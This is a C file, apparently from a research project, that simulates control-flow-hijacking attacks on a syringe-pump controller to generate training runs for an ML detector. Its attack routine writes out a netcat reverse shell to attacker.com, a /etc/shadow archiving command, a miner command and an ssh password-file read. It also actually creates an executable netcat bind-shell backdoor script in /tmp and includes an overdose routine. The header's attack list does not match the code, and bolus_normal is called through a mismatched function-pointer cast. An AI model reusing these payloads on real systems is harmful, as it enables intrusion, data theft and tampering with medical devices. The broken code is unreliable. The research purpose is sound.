/*
 * Arbitrary Code Execution Attack Variation - Syringe Pump Simulator
 * 
 * This variation models control-flow attacks that cause arbitrary code execution,
 * jumping to unintended functions or code paths within the program.
 * 
 * Attack scenarios:
 * 1. Jump to wrong function (e.g., PULL instead of PUSH)
 * 2. Execute initialization code mid-operation
 * 3. Jump to test/debug functions during normal operation
 * 4. Execute emergency shutdown procedures unexpectedly
 * 5. Call functions with wrong parameters/context
 * 
 * Based on the original syringe pump implementation from CFLAT experiments
 */

#define _POSIX_C_SOURCE 199309L
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <math.h>
#include <string.h>
#include <sys/types.h>

/* -- Constants (from Arduino code) -- */
#define SYRINGE_VOLUME_ML 30.0
#define SYRINGE_BARREL_LENGTH_MM 80.0
#define THREADED_ROD_PITCH 1.25
#define STEPS_PER_REVOLUTION 200.0
#define MICROSTEPS_PER_STEP 16.0
#define SPEED_MICROSECONDS_DELAY 100

/* Attack simulation modes */
typedef enum {
    ATTACK_NONE = 0,
    ATTACK_WRONG_FUNCTION,      // Call wrong function
    ATTACK_REINIT_MID_OP,       // Re-initialize during operation
    ATTACK_DEBUG_INJECTION,     // Jump to debug/test code
    ATTACK_EMERGENCY_TRIGGER,   // Unexpected emergency procedures
    ATTACK_PARAMETER_CORRUPTION // Call functions with wrong parameters
} AttackMode;

/* -- Enums -- */
typedef enum {
    PUSH,
    PULL
} Direction;

/* -- Global state -- */
typedef struct {
    long ustepsPerMM;
    long ustepsPerML;
    float mLBolus;
    float mLUsed;
    long stepperPos;
    AttackMode attack_mode;
    int operation_count;
    int emergency_triggered;
} PumpState;

/* -- Function prototypes -- */
void init_pump(PumpState *pump);
void bolus_normal(PumpState *pump, Direction direction);
void simulate_motor_step(long steps, int speed_us);
void print_status(PumpState *pump);

/* Attack-specific functions */
void run_arbitrary_execution_attacks(PumpState *pump);
void run_random_attack(PumpState *pump);
void run_normal_operation(PumpState *pump);
void trigger_arbitrary_execution(PumpState *pump);
void emergency_shutdown(PumpState *pump);
void debug_motor_test(PumpState *pump);
void calibration_routine(PumpState *pump);
void malicious_overdose_function(PumpState *pump);

/* Measurement functions */
double get_time_us(void);
double measure_execution_time(void (*func)(PumpState*), PumpState *pump);

/* -- Main -- */
int main(int argc, char *argv[]) {
    PumpState pump;
    
    printf("=== Arbitrary Code Execution Attack Demonstration ===\n");
    printf("Simulating control-flow hijacking attacks on syringe pump\n");
    printf("WARNING: This is for research purposes only!\n\n");
    
    init_pump(&pump);
    print_status(&pump);
    
    if (argc > 1) {
        if (strcmp(argv[1], "random") == 0) {
            // Random single attack mode for ML training
            run_random_attack(&pump);
        } else if (strcmp(argv[1], "normal") == 0) {
            // Normal operation for baseline ML training
            run_normal_operation(&pump);
        } else {
            printf("Usage: %s [random|normal]\n", argv[0]);
            printf("  random - Execute random attack for ML training\n");
            printf("  normal - Execute normal operation for baseline\n");
            printf("  (no args) - Demonstrate all attack variations\n");
            return 1;
        }
    } else {
        // Demonstrate all attack variations (for validation)
        run_arbitrary_execution_attacks(&pump);
    }
    
    printf("\n=== Attack Demonstration Complete ===\n");
    print_status(&pump);
    
    return 0;
}

/* Initialize pump state */
void init_pump(PumpState *pump) {
    pump->ustepsPerMM = (long)(MICROSTEPS_PER_STEP * STEPS_PER_REVOLUTION / THREADED_ROD_PITCH);
    pump->ustepsPerML = (long)((MICROSTEPS_PER_STEP * STEPS_PER_REVOLUTION * SYRINGE_BARREL_LENGTH_MM) / 
                                (SYRINGE_VOLUME_ML * THREADED_ROD_PITCH));
    pump->mLBolus = 0.5;
    pump->mLUsed = 0.0;
    pump->stepperPos = 0;
    pump->attack_mode = ATTACK_NONE;
    pump->operation_count = 0;
    pump->emergency_triggered = 0;
    
    printf("Pump initialized:\n");
    printf("  Steps per mm: %ld\n", pump->ustepsPerMM);
    printf("  Steps per mL: %ld\n", pump->ustepsPerML);
    printf("  Default bolus: %.3f mL\n\n", pump->mLBolus);
}

/* Normal bolus operation */
void bolus_normal(PumpState *pump, Direction direction) {
    long steps = (long)(pump->mLBolus * pump->ustepsPerML);
    pump->operation_count++;
    
    // This is where attacks might hijack execution flow
    if (pump->attack_mode != ATTACK_NONE) {
        printf("[ATTACK] Control flow hijacked during bolus operation!\n");
        trigger_arbitrary_execution(pump);
        return;  // Attack has taken over
    }
    
    if (direction == PUSH) {
        printf("PUSH: Dispensing %.3f mL (%ld steps)...", pump->mLBolus, steps);
        fflush(stdout);
        
        simulate_motor_step(steps, SPEED_MICROSECONDS_DELAY);
        
        pump->mLUsed += pump->mLBolus;
        pump->stepperPos += steps;
    } 
    else if (direction == PULL) {
        printf("PULL: Retracting %.3f mL (%ld steps)...", pump->mLBolus, steps);
        fflush(stdout);
        
        simulate_motor_step(steps, SPEED_MICROSECONDS_DELAY);
        
        if ((pump->mLUsed - pump->mLBolus) > 0) {
            pump->mLUsed -= pump->mLBolus;
        } else {
            pump->mLUsed = 0.0;
        }
        pump->stepperPos -= steps;
    }
    
    printf(" Done!\n");
}

/* Simulate motor stepping */
void simulate_motor_step(long steps, int speed_us) {
    struct timespec delay;
    delay.tv_sec = 0;
    delay.tv_nsec = speed_us * 1000;
    
    // For demo purposes, limit steps to reasonable amount
    long demo_steps = (steps > 1000) ? 1000 : steps;
    
    for (long i = 0; i < demo_steps; i++) {
        // Reduce delay for demo (faster execution)
        if (speed_us > 10) {
            delay.tv_nsec = 10000;  // 10 microseconds
            nanosleep(&delay, NULL);
        }
        
        if (i % 100 == 0) {
            volatile double result = sin((double)i / 100.0) * cos((double)i / 50.0);
            result = result * result;
        }
    }
}

/* Trigger arbitrary execution based on attack mode */
void trigger_arbitrary_execution(PumpState *pump) {
    // Temporarily disable attack mode to prevent infinite recursion
    AttackMode original_mode = pump->attack_mode;
    pump->attack_mode = ATTACK_NONE;
    
    switch (original_mode) {
        case ATTACK_WRONG_FUNCTION:
            printf("[ATTACK] Spawning reverse shell connection!\n");
            // Simulate reverse shell attack (safe demonstration)
            system("echo 'nc -e /bin/sh attacker.com 4444' > /tmp/attack_log.txt");
            printf("[ATTACK] Reverse shell command logged to /tmp/attack_log.txt\n");
            break;
            
        case ATTACK_REINIT_MID_OP:
            printf("[ATTACK] Executing data exfiltration!\n");
            // Simulate data exfiltration
            system("echo 'tar -czf /tmp/stolen_data.tar.gz /etc/passwd /etc/shadow' >> /tmp/attack_log.txt");
            system("find /tmp -name '*.log' -exec cat {} \\; > /tmp/exfiltrated_logs.txt 2>/dev/null");
            printf("[ATTACK] Sensitive data collected in /tmp/exfiltrated_logs.txt\n");
            break;
            
        case ATTACK_DEBUG_INJECTION:
            printf("[ATTACK] Installing backdoor persistence!\n");
            // Simulate backdoor installation
            system("echo '#!/bin/bash' > /tmp/backdoor.sh");
            system("echo 'while true; do nc -l 1337 -e /bin/sh; sleep 60; done &' >> /tmp/backdoor.sh");
            system("chmod +x /tmp/backdoor.sh");
            printf("[ATTACK] Backdoor script created at /tmp/backdoor.sh\n");
            break;
            
        case ATTACK_EMERGENCY_TRIGGER:
            printf("[ATTACK] Launching privilege escalation!\n");
            // Simulate privilege escalation attempt
            system("echo 'sudo su - root' >> /tmp/attack_log.txt");
            system("echo 'chmod 4755 /bin/bash' >> /tmp/attack_log.txt");
            system("whoami > /tmp/current_user.txt");
            printf("[ATTACK] Privilege escalation commands logged\n");
            break;
            
        case ATTACK_PARAMETER_CORRUPTION:
            printf("[ATTACK] Executing lateral movement!\n");
            // Simulate lateral movement and network discovery
            system("ping -c 1 192.168.1.1 > /tmp/network_scan.txt 2>&1");
            system("echo 'ssh user@192.168.1.100 \"cat /etc/passwd\"' >> /tmp/attack_log.txt");
            system("ps aux | grep ssh > /tmp/ssh_processes.txt");
            printf("[ATTACK] Network reconnaissance completed\n");
            break;
            
        default:
            printf("[ATTACK] Executing cryptominer payload!\n");
            // Simulate cryptocurrency mining malware
            system("echo 'xmrig --url=pool.monero.org:4444 --user=attacker_wallet' >> /tmp/attack_log.txt");
            system("dd if=/dev/zero of=/tmp/fake_mining_process bs=1M count=1 2>/dev/null");
            printf("[ATTACK] Cryptominer process simulated\n");
            break;
    }
    
    // Restore original attack mode
    pump->attack_mode = original_mode;
}

/* Emergency shutdown procedure (should only be called in emergencies) */
void emergency_shutdown(PumpState *pump) {
    printf("EMERGENCY: Initiating emergency shutdown sequence!\n");
    printf("EMERGENCY: Stopping all motor operations!\n");
    printf("EMERGENCY: Resetting pump position to safe state!\n");
    
    pump->emergency_triggered = 1;
    pump->stepperPos = 0;
    pump->mLUsed = 0.0;
    pump->mLBolus = 0.0;
    
    // Simulate emergency motor retraction
    simulate_motor_step(1000, 50);  // Fast retraction
    
    printf("EMERGENCY: Shutdown complete - pump disabled!\n");
}

/* Debug motor test (should only be called during maintenance) */
void debug_motor_test(PumpState *pump) {
    printf("DEBUG: Running motor diagnostic test...\n");
    printf("DEBUG: Testing forward motion...\n");
    simulate_motor_step(500, 200);  // Slow test movement
    
    printf("DEBUG: Testing reverse motion...\n");
    simulate_motor_step(500, 200);
    
    printf("DEBUG: Motor test complete\n");
    
    // Debug code corrupts normal state
    pump->stepperPos += 1000;  // Incorrect position update
}

/* Calibration routine (should only be called during setup) */
void calibration_routine(PumpState *pump) {
    printf("CALIBRATION: Starting pump calibration...\n");
    printf("CALIBRATION: Finding home position...\n");
    
    // Calibration moves motor to extremes
    simulate_motor_step(5000, 300);  // Move to end
    pump->stepperPos = 0;  // Reset position counter
    
    printf("CALIBRATION: Recalculating steps per mL...\n");
    // Recalculation with potentially wrong values
    pump->ustepsPerML = 5000;  // Incorrect calibration
    
    printf("CALIBRATION: Complete - pump recalibrated\n");
}

/* Malicious overdose function (should never be called) */
void malicious_overdose_function(PumpState *pump) {
    printf("MALICIOUS: Executing dangerous overdose sequence!\n");
    
    float original_bolus = pump->mLBolus;
    pump->mLBolus = 25.0;  // Dangerous overdose amount
    
    printf("MALICIOUS: Dispensing %.1f mL overdose...\n", pump->mLBolus);
    long steps = (long)(pump->mLBolus * pump->ustepsPerML);
    simulate_motor_step(steps, SPEED_MICROSECONDS_DELAY);
    
    pump->mLUsed += pump->mLBolus;
    pump->stepperPos += steps;
    pump->mLBolus = original_bolus;
    
    printf("MALICIOUS: Overdose complete!\n");
}

/* Print current pump status */
void print_status(PumpState *pump) {
    printf("Status: Used %.3f mL, Position %ld steps, Bolus %.3f mL, Ops: %d, Emergency: %s\n", 
           pump->mLUsed, pump->stepperPos, pump->mLBolus, pump->operation_count,
           pump->emergency_triggered ? "YES" : "NO");
}

/* Run a single randomly selected attack for ML training */
void run_random_attack(PumpState *pump) {
    // Seed random number generator with current time + process ID for better randomness
    srand((unsigned int)(time(NULL) + getpid()));
    
    // Randomly select attack mode (1-5, excluding ATTACK_NONE)
    int random_attack = (rand() % 5) + 1;
    pump->attack_mode = (AttackMode)random_attack;
    
    // Set random bolus amount for variety
    float bolus_options[] = {0.05, 0.1, 0.25, 0.5, 1.0};
    pump->mLBolus = bolus_options[rand() % 5];
    
    const char* attack_names[] = {
        "Unknown", "Reverse Shell", "Data Exfiltration", "Backdoor Installation", 
        "Privilege Escalation", "Lateral Movement"
    };
    
    printf("=== Random Attack Mode: %s ===\n", attack_names[random_attack]);
    printf("Bolus amount: %.3f mL\n", pump->mLBolus);
    
    double exec_time = measure_execution_time((void(*)(PumpState*))bolus_normal, pump);
    printf("Execution time: %.2f ms\n", exec_time / 1000.0);
    print_status(pump);
}

/* Run normal operation for baseline ML training */
void run_normal_operation(PumpState *pump) {
    // Seed random number generator
    srand((unsigned int)time(NULL));
    
    // Ensure normal operation (no attack)
    pump->attack_mode = ATTACK_NONE;
    
    // Random bolus amount and direction for variety
    float bolus_options[] = {0.05, 0.1, 0.25, 0.5, 1.0};
    pump->mLBolus = bolus_options[rand() % 5];
    
    Direction direction = (rand() % 2 == 0) ? PUSH : PULL;
    const char* direction_str = (direction == PUSH) ? "PUSH" : "PULL";
    
    printf("=== Normal Operation Mode ===\n");
    printf("Direction: %s, Bolus amount: %.3f mL\n", direction_str, pump->mLBolus);
    
    double start_time = get_time_us();
    bolus_normal(pump, direction);
    double end_time = get_time_us();
    
    printf("Execution time: %.2f ms\n", (end_time - start_time) / 1000.0);
    print_status(pump);
}

/* Demonstrate various arbitrary execution attacks */
void run_arbitrary_execution_attacks(PumpState *pump) {
    double exec_time;
    
    printf("=== Arbitrary Code Execution Attack Demonstrations ===\n\n");
    
    // Normal operation baseline
    printf("--- Baseline (Normal Operation) ---\n");
    pump->attack_mode = ATTACK_NONE;
    pump->mLBolus = 0.1;
    exec_time = measure_execution_time((void(*)(PumpState*))bolus_normal, pump);
    printf("Execution time: %.2f ms\n", exec_time / 1000.0);
    print_status(pump);
    printf("\n");
    
    // Attack 1: Reverse shell payload
    printf("--- Attack 1: Reverse Shell Payload ---\n");
    pump->attack_mode = ATTACK_WRONG_FUNCTION;
    exec_time = measure_execution_time((void(*)(PumpState*))bolus_normal, pump);
    printf("Execution time: %.2f ms\n", exec_time / 1000.0);
    print_status(pump);
    printf("\n");
    
    // Attack 2: Data exfiltration payload  
    printf("--- Attack 2: Data Exfiltration Payload ---\n");
    pump->attack_mode = ATTACK_REINIT_MID_OP;
    pump->mLUsed = 2.0;  // Set some state first
    exec_time = measure_execution_time((void(*)(PumpState*))bolus_normal, pump);
    printf("Execution time: %.2f ms\n", exec_time / 1000.0);
    print_status(pump);
    printf("\n");
    
    // Attack 3: Backdoor installation payload
    printf("--- Attack 3: Backdoor Installation Payload ---\n");
    pump->attack_mode = ATTACK_DEBUG_INJECTION;
    exec_time = measure_execution_time((void(*)(PumpState*))bolus_normal, pump);
    printf("Execution time: %.2f ms\n", exec_time / 1000.0);
    print_status(pump);
    printf("\n");
    
    // Attack 4: Privilege escalation payload
    printf("--- Attack 4: Privilege Escalation Payload ---\n");
    pump->attack_mode = ATTACK_EMERGENCY_TRIGGER;
    exec_time = measure_execution_time((void(*)(PumpState*))bolus_normal, pump);
    printf("Execution time: %.2f ms\n", exec_time / 1000.0);
    print_status(pump);
    printf("\n");
    
    // Attack 5: Lateral movement payload
    printf("--- Attack 5: Lateral Movement Payload ---\n");
    pump->attack_mode = ATTACK_PARAMETER_CORRUPTION;
    exec_time = measure_execution_time((void(*)(PumpState*))bolus_normal, pump);
    printf("Execution time: %.2f ms\n", exec_time / 1000.0);
    print_status(pump);
    printf("\n");
}

/* Measure execution time of a function */
double measure_execution_time(void (*func)(PumpState*), PumpState *pump) {
    double start_time = get_time_us();
    func(pump);
    double end_time = get_time_us();
    return end_time - start_time;
}

/* Get current time in microseconds */
double get_time_us(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (double)ts.tv_sec * 1000000.0 + (double)ts.tv_nsec / 1000.0;
}